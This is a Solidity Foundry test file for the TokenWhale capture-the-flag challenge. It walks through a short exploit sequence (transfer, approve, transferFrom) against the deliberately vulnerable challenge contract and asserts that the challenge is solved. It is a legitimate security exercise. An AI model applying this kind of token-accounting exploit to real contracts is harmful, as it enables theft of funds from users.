// SPDX-License-Identifier: MIT
pragma solidity ^0.6.2;
pragma experimental ABIEncoderV2;

import { Test } from "forge-std/Test.sol";
import { TokenWhaleChallenge } from "../src/challenges/11_TokenWhale/TokenWhaleChallenge.sol";
import { TokenWhaleAttack } from "../src/attacks/TokenWhaleAttack.sol";

contract TokenWhaleTest is Test {
    TokenWhaleChallenge public challenge;

    function setUp() public {
        challenge = new TokenWhaleChallenge(address(this));
    }

    function test() public {
        TokenWhaleAttack attacker = new TokenWhaleAttack();
        challenge.transfer(address(attacker), 1000);
        attacker.approve(challenge, address(this), 1);
        challenge.transferFrom(address(attacker), address(challenge), 1);

        assertTrue(challenge.isComplete());
    }
}
